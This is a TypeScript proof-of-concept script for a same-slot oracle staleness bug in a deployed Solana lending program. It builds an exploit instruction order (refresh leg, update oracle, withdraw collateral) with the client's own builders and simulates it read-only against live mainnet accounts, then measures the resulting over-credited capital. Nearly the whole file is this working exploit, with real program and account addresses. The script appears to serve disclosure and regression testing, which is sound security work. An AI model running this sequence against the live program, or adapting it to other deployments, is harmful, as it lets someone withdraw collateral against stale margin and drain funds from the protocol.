/**
 * Regression PoC: same-slot pre-oracle staleness on the DEPLOYED 887ba02 core.
 *
 * The deployed `checkAllLegsFreshLoop` (Percolator/Program.lean:201-215 at
 * percolator-lean@887ba02) checks ONLY `leg.lastRefreshSlot == curSlot`.
 * Upstream 8774e86 adds `entryK == mkt.kSide`, a `postOracle` flag and a live
 * `cachedMm` recomputation, and rejects this exact sequence with Custom(122).
 *
 * This script builds the three instruction sequences with the CLIENT'S OWN
 * builders and simulates them against LIVE mainnet state via
 * `simulateTransaction` with `sigVerify=false` + `replaceRecentBlockhash=true`.
 * `sigVerify=false` preserves the message's is_signer flags, which is what the
 * on-chain program checks. READ-ONLY: nothing is signed or sent.
 *
 *   honest  : [UpdateOracle, RefreshLeg, WithdrawCollateral]
 *   EXPLOIT : [RefreshLeg, UpdateOracle, WithdrawCollateral]
 *
 * Run:  LEAN_RPC_URL=<rpc> npx tsx scripts/lean-same-slot-staleness-poc.ts
 * Exit 0 = exploit reproduced, exit 1 = not reproduced.
 */
import { PublicKey, Transaction, TransactionInstruction } from "@solana/web3.js";
import {
  refreshLeg, updateOracle, withdrawCollateral,
  parseMarket, parsePortfolio, parseDex,
} from "../src/lean/index.js";

const RPC = process.env.LEAN_RPC_URL ?? "https://api.mainnet-beta.solana.com";

// lean-mainnet-r4.json / README.md round-4 manifest
const PROG = new PublicKey("EUj4Jj8SY3MpkboazJWLeUMmZjCAwwaUhkAGXZQNfLnB");
const DEX = new PublicKey("6ogqEo6qbCY5dmjkBQNXntoESE4HDHwKQGnushbPysFn");
const MARKET = new PublicKey("4EWHoCLweWAbb1DZ2sUfLRLnL9xvNJEwhnekaV7qthAp");
const ORACLE_AUTH = new PublicKey("GidoyxeAwxEJNFf35QXosmQq8ZPm13csVBRmciAxGw7i");
const OWNER = new PublicKey("A3Mu2nQdjJXhJkuUDBbF2BdvgDs5KodNE9XsetXNMrCK");
const USER_LONG = new PublicKey("9vtoSvrhv5vw7qt6oUdBw835B4pejrmbjWmie3uz2RMh");
const VAULT = new PublicKey("6QpiiVPG5vZxuecBpfanwaJk5n3ppmfn4DHGx4ud8xoU");
const DEST_TOK = new PublicKey("2tsVGZWb8J3mZLHP9xHkcGoJyhy3Vu4fQVs7utQEGcu7");
const MINT = new PublicKey("EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v");
const TOK_PROG = new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");

const MARK_PRICE = 59_308_862_500n;   // live market.markPrice
const NEW_PRICE = MARK_PRICE - 300_000_000n;  // -0.506%, inside maxMoveBps=100
const AMOUNT = 1_000_000n;           // $1
const WATCH = [MARKET, USER_LONG, DEX];

const V = { dex: DEX, mint: MINT, vault: VAULT, tokenProgram: TOK_PROG };

const rl = () => refreshLeg(PROG, { dex: DEX, market: MARKET, portfolio: USER_LONG });
const uo = () => updateOracle(PROG, { market: MARKET, oracleAuth: ORACLE_AUTH, price: NEW_PRICE });
const wd = (amount: bigint) => withdrawCollateral(PROG, V, {
  portfolio: USER_LONG, owner: OWNER, destToken: DEST_TOK, amount,
});

function serialize(ixs: TransactionInstruction[]): string {
  // Dummy blockhash is replaced by the RPC; zeroed signatures are accepted
  // because sigVerify=false. Transaction preserves the is_signer flags.
  const tx = new Transaction({
    feePayer: OWNER,
    recentBlockhash: "11111111111111111111111111111111",
  });
  tx.add(...ixs);
  const msg = tx.compileMessage();
  const n = msg.header.numRequiredSignatures;
  tx.signatures = msg.accountKeys.slice(0, n).map((publicKey) => ({
    publicKey, signature: Buffer.alloc(64),
  }));
  return tx.serialize({ requireAllSignatures: false, verifySignatures: false })
    .toString("base64");
}

async function rpc(method: string, params: unknown[]): Promise<any> {
  const res = await fetch(RPC, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ jsonrpc: "2.0", id: 1, method, params }),
  });
  const body = await res.json() as any;
  if (body.error) throw new Error(JSON.stringify(body.error));
  return body.result;
}

interface State {
  market: ReturnType<typeof parseMarket>;
  pfl: ReturnType<typeof parsePortfolio>;
  dex: ReturnType<typeof parseDex>;
  err: any;
  logs: string[];
  unitsConsumed?: number;
}

async function simulate(ixs: TransactionInstruction[]): Promise<State> {
  const value = await rpc("simulateTransaction", [serialize(ixs), {
    sigVerify: false,
    replaceRecentBlockhash: true,
    commitment: "confirmed",
    encoding: "base64",
    accounts: { encoding: "base64", addresses: WATCH.map((k) => k.toBase58()) },
  }]).then((r: any) => r.value);
  const accounts = (value.accounts ?? []).map((a: any) =>
    a ? Buffer.from(a.data[0], "base64") : null);
  const bySize = (n: number) => accounts.find((b: Buffer | null) => b && b.length === n);
  return {
    market: parseMarket(bySize(416)),
    pfl: parsePortfolio(bySize(976)),
    dex: parseDex(bySize(208)),
    err: value.err,
    logs: value.logs ?? [],
    unitsConsumed: value.unitsConsumed,
  };
}

async function main() {
  console.log(`RPC: ${RPC.replace(/api-key=[^&]+/, "api-key=***")}`);
  const honest = await simulate([uo(), rl(), wd(AMOUNT)]);
  const exploit = await simulate([rl(), uo(), wd(AMOUNT)]);
  const control = await simulate([rl(), uo(), rl(), wd(AMOUNT)]);

  for (const [label, s] of [["honest", honest], ["EXPLOIT", exploit],
                            ["re-refresh control", control]] as const) {
    console.log(`\n${label}: ${s.err ? "ERR " + JSON.stringify(s.err) : "OK"}` +
      ` unitsConsumed=${s.unitsConsumed} percolatorLogs=${s.logs.filter((l) => l.includes(PROG.toBase58())).length}`);
    console.log(`  market.kLong      = ${s.market.kLong}`);
    console.log(`  leg0.entryK       = ${s.pfl.legs[0]?.entryK}`);
    console.log(`  staleDelta        = ${BigInt(s.pfl.legs[0]?.entryK ?? 0n) - s.market.kLong}`);
    console.log(`  pfl.capital       = ${s.pfl.capital}`);
    console.log(`  dex.totalResidual = ${s.dex.totalResidual}`);
  }

  const staleDelta = BigInt(exploit.pfl.legs[0]?.entryK ?? 0n) - exploit.market.kLong;
  const capitalDelta = exploit.pfl.capital - honest.pfl.capital;
  const residualDelta = honest.dex.totalResidual - exploit.dex.totalResidual;

  console.log(`\n=== DIVERGENCE ===`);
  console.log(`  exploit capital - honest capital       = ${capitalDelta} E6`);
  console.log(`  honest R_m - exploit R_m (under-credit) = ${residualDelta} E6`);
  console.log(`  unsettled K delta                      = ${staleDelta}`);
  console.log(`  re-refresh control staleDelta          = ` +
    `${BigInt(control.pfl.legs[0]?.entryK ?? 0n) - control.market.kLong}`);

  const ok = exploit.err === null && honest.err === null && control.err === null &&
    staleDelta !== 0n && capitalDelta > 0n && residualDelta > 0n &&
    BigInt(control.pfl.legs[0]?.entryK ?? 0n) === control.market.kLong;

  console.log(`\n${ok ? "EXPLOIT REPRODUCED" : "EXPLOIT NOT REPRODUCED"}`);
  console.log("The deployed 887ba02 build accepts a WithdrawCollateral authorised");
  console.log("against stale margin. Upstream 8774e86's verifyLegFreshAgainstMkt");
  console.log("requires entryK == kSide, postOracle == 1 and a live cachedMm check;");
  console.log("all three fail on the EXPLOIT post-state, so the fixed build rejects");
  console.log("with PErr.stalePortfolioLeg Custom(122) (boring_tests.rs t29 1A).");
  process.exit(ok ? 0 : 1);
}

main().catch((e) => { console.error(String(e)); process.exit(2); });
